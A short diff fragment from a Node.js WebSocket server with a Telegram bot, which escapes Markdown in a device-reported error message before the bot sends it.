               { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } }
             );
           }
@@ -1662,7 +1662,7 @@ wss.on('connection', (ws, req) => {
               handleBotFileDownload(pending.chatId, deviceId, payload);
             } else if (payload.action === 'error') {
               pendingBotFileRequests.delete(deviceId);
-              if (bot) bot.sendMessage(pending.chatId, `❌ Error: ${payload.message}`);
+              if (bot) bot.sendMessage(pending.chatId, `❌ Error: ${escapeMd(payload.message)}`);
             }
           }
 
